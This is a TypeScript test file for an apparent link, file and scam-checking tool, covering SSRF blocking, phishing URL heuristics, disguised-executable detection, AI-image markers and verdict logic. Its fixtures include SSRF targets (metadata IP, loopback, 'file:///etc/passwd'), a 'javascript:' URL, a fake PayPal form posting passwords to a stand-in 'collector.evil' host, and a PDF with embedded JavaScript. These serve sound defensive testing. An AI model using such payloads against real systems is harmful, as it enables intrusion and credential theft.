import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { zipSync, strToU8 } from "fflate";
import { BlockedUrlError, isPublicAddress, normalizeUrl } from "./url-guard.ts";
import { decideLinkStatus, pageSignals, redirectSignals, urlSignals } from "./url-heuristics.ts";
import { extractText, fileSafety, sniffType } from "./file-inspect.ts";
import { dHashFromPixels, findMarkers, hamming, markerFindings, pngTextChunks } from "./media-inspect.ts";
import { claimFindings, readProductPage } from "./product-signals.ts";
import { overallFrom, emptyChecker, type CheckerResult } from "./types.ts";

const titles = (f: { title: string }[]) => f.map((x) => x.title).join(" | ");
const has = (f: { title: string }[], re: RegExp) => f.some((x) => re.test(x.title));

describe("url guard (SSRF)", () => {
  it("blocks private, loopback, link-local, metadata and mapped addresses", () => {
    for (const ip of ["127.0.0.1", "10.0.0.5", "192.168.1.1", "172.16.0.1", "169.254.169.254", "0.0.0.0", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1", "100.64.0.1", "224.0.0.1", "255.255.255.255"]) {
      assert.equal(isPublicAddress(ip), false, ip);
    }
    for (const ip of ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111"]) assert.equal(isPublicAddress(ip), true, ip);
    assert.equal(isPublicAddress("not-an-ip"), false);
  });
  it("only accepts plain http(s) links on standard ports", () => {
    assert.equal(normalizeUrl("example.com/a#frag").toString(), "https://example.com/a");
    for (const bad of ["file:///etc/passwd", "ftp://x.com", "javascript:alert(1)", "http://user:pw@x.com", "http://x.com:8080", "http://localhost", "http://db.internal", "http://printer.local", "", "a".repeat(3000)]) {
      assert.throws(() => normalizeUrl(bad), BlockedUrlError, bad);
    }
  });
  it("normalizes numeric IPs so they can be checked", () => {
    assert.equal(normalizeUrl("http://2130706433/").hostname, "127.0.0.1");
    assert.equal(isPublicAddress(normalizeUrl("http://0x7f000001/").hostname), false);
  });
});

describe("url heuristics", () => {
  it("flags brand impersonation and look-alikes", () => {
    assert.ok(has(urlSignals(new URL("https://paypal-secure-login.xyz/verify")), /paypal/i), "paypal");
    assert.ok(has(urlSignals(new URL("https://paypa1.com/")) .concat(urlSignals(new URL("https://paypai.com/"))), /spelled differently/i));
    assert.ok(has(urlSignals(new URL("https://mtn-bonus.top/claim")), /mtn/i));
  });
  it("does not flag the brands' own domains or innocent words", () => {
    assert.equal(has(urlSignals(new URL("https://www.paypal.com/signin")), /isn't theirs|spelled/), false);
    assert.equal(has(urlSignals(new URL("https://lh3.googleusercontent.com/a.png")), /isn't theirs/), false);
    // "mtn" must be a whole label, not part of "mountain".
    assert.equal(has(urlSignals(new URL("https://mountainbikes.com/")), /mtn/i), false);
  });
  it("spots raw IPs, punycode, @ tricks, http and executables", () => {
    const f = urlSignals(new URL("http://93.184.216.34/x@y/setup.exe"));
    assert.ok(has(f, /raw IP/));
    assert.ok(has(f, /Not encrypted/));
    assert.ok(has(f, /download of a program/));
    assert.ok(has(urlSignals(new URL("https://xn--pypal-4ve.com/")), /punycode/));
  });
  it("reads dangerous page content", () => {
    const page = `<title>PayPal Login</title><form action="https://collector.evil/p"><input type="password"></form> enter your 12-word recovery phrase`;
    const f = pageSignals(page, new URL("https://paypal-help.xyz/"), "text/html");
    assert.ok(has(f, /Password form sends to another website/), titles(f));
    assert.ok(has(f, /recovery phrase/));
    assert.ok(has(f, /Page titled as paypal/i));
    assert.ok(has(pageSignals("", new URL("https://x.com/"), "application/x-msdownload"), /downloads a program/));
  });
  it("counts redirect domains", () => {
    const hops = ["https://bit.ly/a", "https://t.co/b", "https://evil.top/c"].map((url) => ({ url, status: 301 }));
    assert.ok(has(redirectSignals(hops), /3 different domains/));
    assert.equal(redirectSignals([{ url: "https://a.com", status: 200 }]).length, 0);
  });
});

describe("file inspection", () => {
  it("detects real types from signatures", () => {
    assert.equal(sniffType(Buffer.from("%PDF-1.7\n")).kind, "pdf");
    assert.equal(sniffType(Buffer.from("MZ\x90\x00")).kind, "executable");
    assert.equal(sniffType(Buffer.from("89504e470d0a1a0a0000", "hex")).mime, "image/png");
    assert.equal(sniffType(Buffer.from("hello world, plain text")).kind, "text");
    const docx = Buffer.from(zipSync({ "word/document.xml": strToU8("<w:p>Hi</w:p>") }));
    assert.equal(sniffType(docx, "a.docx").label, "Word document");
  });
  it("flags disguised programs and double extensions", () => {
    const exe = Buffer.from("MZ\x90\x00rest");
    const f = fileSafety(exe, "invoice.pdf.exe", sniffType(exe, "invoice.pdf.exe"));
    assert.ok(has(f, /This is a program/));
    assert.ok(has(f, /Double file extension/));
    const fake = fileSafety(exe, "ebook.pdf", sniffType(exe));
    assert.ok(has(fake, /program/));
    const png = Buffer.from("89504e470d0a1a0a", "hex");
    assert.ok(has(fileSafety(png, "guide.pdf", sniffType(png)), /really a PNG image/));
  });
  it("looks inside archives without unpacking them", () => {
    const zip = Buffer.from(zipSync({ "readme.txt": strToU8("hi"), "bonus/setup.exe": strToU8("MZ"), "photo.jpg.exe": strToU8("MZ") }));
    const f = fileSafety(zip, "course.zip", sniffType(zip, "course.zip"));
    assert.ok(has(f, /Contains 2 program/), titles(f));
    assert.ok(has(f, /Disguised files inside/));
    const macro = Buffer.from(zipSync({ "word/document.xml": strToU8("<w:p/>"), "word/vbaProject.bin": strToU8("x") }));
    assert.ok(has(fileSafety(macro, "a.docm", sniffType(macro)), /macros/));
  });
  it("finds active content in PDFs and extracts docx text", () => {
    const pdf = Buffer.from("%PDF-1.4\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) /URI (http://x) >> endobj");
    const f = fileSafety(pdf, "a.pdf", sniffType(pdf));
    assert.ok(has(f, /JavaScript/));
    assert.ok(has(f, /opens a web link/));
    const docx = Buffer.from(zipSync({ "word/document.xml": strToU8("<w:p><w:t>Earn money</w:t></w:p>") }));
    assert.match(extractText(docx, sniffType(docx)) ?? "", /Earn money/);
  });
});

function pngWithText(key: string, value: string): Buffer {
  const sig = Buffer.from("89504e470d0a1a0a", "hex");
  const data = Buffer.concat([Buffer.from(key, "latin1"), Buffer.from([0]), Buffer.from(value, "latin1")]);
  const chunk = (type: string, body: Buffer) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(body.length);
    return Buffer.concat([len, Buffer.from(type, "latin1"), body, Buffer.alloc(4)]);
  };
  return Buffer.concat([sig, chunk("tEXt", data), chunk("IEND", Buffer.alloc(0))]);
}

describe("media markers", () => {
  it("reads AI prompts stored by Stable Diffusion", () => {
    const png = pngWithText("parameters", "a cat, Steps: 20, Sampler: Euler");
    assert.equal(pngTextChunks(png).parameters, "a cat, Steps: 20, Sampler: Euler");
    const m = findMarkers(png, null);
    assert.equal(m.sdParameters, true);
    assert.ok(has(markerFindings(m), /AI generation prompt/));
  });
  it("reads the IPTC AI source type and never calls a clean file human-made", () => {
    const iptc = Buffer.from('<x:xmpmeta><Iptc4xmpExt:DigitalSourceType>http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia</Iptc4xmpExt:DigitalSourceType></x:xmpmeta>');
    assert.ok(findMarkers(iptc, null).declaredAi.length > 0);
    const clean = markerFindings(findMarkers(Buffer.from("plain bytes"), null));
    assert.ok(has(clean, /No AI or provenance markers/));
    assert.equal(clean.some((x) => /human/i.test(x.title)), false);
  });
  it("computes perceptual hashes and distances", () => {
    const px = new Uint8Array(72).map((_, i) => (i * 37) % 256);
    const h = dHashFromPixels(px);
    assert.equal(h.length, 16);
    assert.equal(hamming(h, h), 0);
    assert.equal(hamming("0000000000000000", "000000000000000f"), 4);
  });
});

describe("product signals", () => {
  it("catches income and scarcity claims", () => {
    const f = claimFindings("Guaranteed income! Earn $500 per day with my secret method. Only 3 spots left. PLR included.");
    assert.ok(has(f, /guaranteed income/i));
    assert.ok(has(f, /per day/));
    assert.ok(has(f, /Secret method/i));
    assert.ok(has(f, /scarcity/));
    assert.ok(has(f, /resell rights/));
    assert.equal(claimFindings("A practical guide to baking bread at home.").length, 0);
  });
  it("reads product structured data", () => {
    const html = `<script type="application/ld+json">{"@type":"Product","name":"Course","offers":{"price":"19","priceCurrency":"USD"}}</script><a href="/refund-policy">Refunds</a> contact us`;
    const p = readProductPage(html);
    assert.equal(p.isProduct, true);
    assert.equal(p.name, "Course");
    assert.equal(p.price, "USD 19");
  });
});

describe("overall verdict", () => {
  const c = (status: CheckerResult["status"]): CheckerResult => ({ ...emptyChecker("links", ""), status });
  it("lets the worst result decide and never turns missing data into safe", () => {
    assert.equal(overallFrom([c("low_risk"), c("known_threat")]).level, "known_threat");
    assert.equal(overallFrom([c("low_risk"), c("evidence_found")]).level, "suspicious");
    assert.equal(overallFrom([c("low_risk"), c("unavailable")]).level, "inconclusive");
    assert.equal(overallFrom([c("low_risk"), c("low_risk")]).level, "low_risk");
    assert.equal(overallFrom([c("not_applicable")]).level, "inconclusive");
  });
});


describe("link verdict requires enough evidence", () => {
  it("never calls an unreachable page low risk from a clean reputation list alone", () => {
    assert.equal(decideLinkStatus([], false, false, true), "inconclusive");
  });
  it("does not call a fetched page low risk when reputation checks were unavailable", () => {
    assert.equal(decideLinkStatus([], false, true, false), "inconclusive");
  });
  it("allows low risk only when the page and reputation source were both checked", () => {
    assert.equal(decideLinkStatus([], false, true, true), "low_risk");
  });
  it("keeps threat findings higher priority than unavailable evidence", () => {
    assert.equal(decideLinkStatus([{ tone: "bad", title: "Threat", source: "test" }], true, false, false), "known_threat");
  });
});
